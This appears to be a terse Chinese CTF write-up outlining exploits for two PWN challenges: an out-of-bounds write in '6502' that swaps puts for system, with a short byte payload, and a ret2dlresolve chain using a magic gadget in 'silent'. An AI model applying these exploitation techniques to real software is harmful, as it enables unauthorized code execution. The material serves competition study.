## 10+ 道题详解

### PWN
1. **6502**（汇编越界读写）
   - 越界读写 puts 改 system
   - payload 字节写入 ac, jmp, nop_code
   ```python
   payload = b"\xad\x42\xdf"  # get libc
   payload += b"\x69\xb0"  # add 0x92
   payload += b"\x8d\xf2\xde"  # write ac
   ```

2. **silent**（libc-2.27）
   - `__libc_csu_init` + ret2dlresolve
   - magic gadget = 0x4007e8（`add dword ptr [rbp - 0x3d], ebx; nop; ret`）
   - stdout+0x3d 地址用 magic 写入 0x601b10
   - read 0x601a00 触发 dlresolve
